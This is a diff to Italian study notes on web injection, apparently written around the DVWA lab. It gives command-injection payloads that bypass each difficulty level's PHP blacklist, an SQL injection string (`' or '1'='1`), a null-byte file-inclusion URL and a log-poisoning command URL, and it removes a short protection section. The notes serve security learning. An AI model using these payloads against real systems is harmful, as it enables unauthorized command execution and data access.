@@ -1,11 +1,9 @@
 ## Command injection
 
-- http://www.scribd.com/doc/2530476/Php-Endangers-Remote-Code-Execution ✔
-- http://www.ss64.com/bash/ ✔
-- http://www.ss64.com/nt/ ✔
-- https://www.owasp.org/index.php/Command_Injection \#TODO
+- http://www.scribd.com/doc/2530476/Php-Endangers-Remote-Code-Execution
+- https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A1-Injection
 
-I valori inseriti dall'utente non vengono opportunamente sanitizzati.
+I valori inseriti dall'utente non vengono opportunamente sanitizzati lato server.
 
 > https://www.exploit-db.com/papers/13073
 
@@ -29,6 +27,7 @@ fclose($log);
 ```
 
 L'input dell'utente non viene sanitizzato.
+
 L'attaccante può sfruttare questa vulnerabilità per eseguire comandi come `phpinfo();`.
 
 `info.php`
@@ -50,7 +49,7 @@ Quando il file di log viene richiesto passando col parametro `cmd` il comando `c
 
 `http://victim.xxx/errorlog.php?cmd=<command>`
 
-#### Null Byte Injection
+**Null Byte Injection**
 
 `include.php`
 
@@ -65,27 +64,71 @@ L'attaccante esclude `.php` dal nome del file inserendo il terminatore `%00` nel
 
 `http://victim.xxx/include.php?file=secret.txt%00`
 
+> https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A1-Injection
+
+```
+String query = "SELECT * FROM accounts WHERE custID='" + request.getParameter("id") + "'";
+```
+
+oppure
+
+```
+Query HQLQuery = session.createQuery("FROM accounts WHERE custID='" + request.getParameter("id") + "'");
+```
+
+L'attaccante invia come parametro id il valore `' or '1'='1`, che cambia il significato della query.
+
+`http://example.com/app/accountView?id=' or '1'='1`
+
 ### Command injection - Low
+
+```
+// *nix
+$cmd = shell_exec( 'ping  -c 4 ' . $target );
+```
 
 - inietta il comando CMD inserendo i seguenti valori:
 
 	- `8.8.8.8; CMD`
-	- `8.8.8.8 && CMD`
-	- `8.8.8.8 & CMD`
-	- `8.8.8.8 | CMD`
 
 ### Command injection - Medium
 
+```
+// Set blacklist
+$substitutions = array(
+	'&&' => '',
+	';'  => '',
+);
+
+// Remove any of the charactars in the array (blacklist).
+$target = str_replace( array_keys( $substitutions ), $substitutions, $target ); 
+```
+
 - inietta il comando CMD inserendo i seguenti valori:
 
-	- `8.8.8.8 & CMD`
 	- `8.8.8.8 | CMD`
 
 ### Command injection - High
 
-\#TODO http://172.17.0.2/vulnerabilities/exec/
+```
+	// Set blacklist
+	$substitutions = array(
+	'&'  => '',
+	';'  => '',
+	'| ' => '',
+	'-'  => '',
+	'$'  => '',
+	'('  => '',
+	')'  => '',
+	'`'  => '',
+	'||' => '',
+	);
 
-### Command injection - Protection
+	// Remove any of the charactars in the array (blacklist).
+	$target = str_replace( array_keys( $substitutions ), $substitutions, $target );
+```
 
-Per php usare `htmlentities()`, `htmlspecialchars()`, `strip_tags()`, `stripslashes()`.
+- inietta il comando CMD inserendo i seguenti valori:
+
+	- `8.8.8.8 |CMD`
 
